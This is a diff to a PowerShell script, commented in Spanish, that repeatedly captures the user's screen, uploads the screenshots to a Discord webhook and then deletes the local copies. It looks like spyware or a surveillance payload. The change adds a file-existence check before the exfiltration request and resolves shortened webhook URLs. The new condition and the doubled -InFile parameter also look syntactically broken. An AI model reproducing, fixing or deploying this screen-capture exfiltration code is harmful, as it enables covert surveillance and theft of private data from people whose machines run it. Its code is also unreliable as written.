@@ -10,7 +10,7 @@ $stopCommand = "stop"
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected..v" 
+    Write-Host "Shortened Webhook URL Detected..ll" 
     $hookurl = (irm $hookurl).url
 }
 
@@ -61,8 +61,13 @@ While ($true){
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
     
-    # Enviar ambas capturas de pantalla al webhook de Discord
-    Invoke-WebRequest -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
+    # Enviar ambas capturas de pantalla al webhook de Discord si los archivos existen
+    if (Test-Path $file1 -and Test-Path $file2) {
+        Invoke-WebRequest -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
+    }
+    else {
+        Write-Host "Uno o ambos archivos de captura de pantalla no existen."
+    }
     
     # Eliminar las capturas de pantalla después de enviarlas
     Remove-Item -Path $file1
